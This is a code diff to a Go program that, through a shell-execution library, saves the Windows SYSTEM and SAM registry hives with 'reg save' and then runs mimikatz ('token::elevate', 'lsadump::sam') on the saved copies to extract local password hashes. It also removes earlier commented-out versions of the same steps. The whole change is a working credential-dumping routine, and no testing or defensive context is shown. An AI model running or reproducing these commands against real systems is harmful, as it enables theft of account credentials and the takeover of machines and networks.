@@ -22,30 +22,18 @@ func main() {
 		panic(err)
 		return
 	}
-	stdout, _, err := shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' lsadump::sam system.hiv sam.hiv exit")
+	stdout, _, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system2.hiv")
+	if err != nil {
+		panic(err.Error())
+	}
+	stdout, _, err = shell.Execute("reg save HKLM\\SAM mimi/x64/sam2.hiv")
 	if err != nil {
 		panic(err.Error())
 	}
 	fmt.Println(stdout)
-	//dir, _ := os.Getwd()
-	//fmt.Println("Dir", dir)
-	//stdout, stderr, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system.hiv")
-	//if err != nil {
-	//	panic(err.Error())
-	//}
-	//fmt.Println("error", stderr)
-	//fmt.Println(stdout)
-	//stdout, stderr, err = shell.Execute("reg save HKLM\\SAM mimi/x64/sam.hiv")
-	//if err != nil {
-	//	panic(err.Error())
-	//}
-	//fmt.Println("error", stderr)
-	//fmt.Println(stdout)
-	//dir, _ = os.Getwd()
-	//fmt.Println("Dir", dir)
-	//stdout, _, err = shell.Execute("cd mimi/x64 & .\\mimikatz & token::elevate")
-	//if err != nil {
-	//	panic(err.Error())
-	//}
-	//fmt.Println(stdout)
+	stdout, _, err = shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' lsadump::sam system2.hiv sam2.hiv exit")
+	if err != nil {
+		panic(err.Error())
+	}
+	fmt.Println(stdout)
 }
